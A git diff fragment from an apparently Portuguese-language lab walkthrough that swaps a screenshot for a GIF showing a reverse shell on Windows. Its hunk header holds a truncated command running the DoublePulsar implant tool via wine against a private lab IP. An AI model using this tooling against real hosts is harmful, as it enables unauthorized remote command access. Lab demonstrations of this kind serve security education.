@@ -59,4 +59,4 @@ wine Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp 172.16.1.145 --TargetPo
 <br>
  
 Observe que a conexão reversa foi estabelecida e foi obtido acesso ao prompt de comando do Windows:
-![image](https://user-images.githubusercontent.com/76706456/172243037-3162bf1f-c6ad-45d6-a841-f9cd5cbc5c1b.png)
+![win7xp_poc](https://user-images.githubusercontent.com/76706456/197264178-7f4e5c55-00f2-4499-8461-ab6087cad01a.gif)
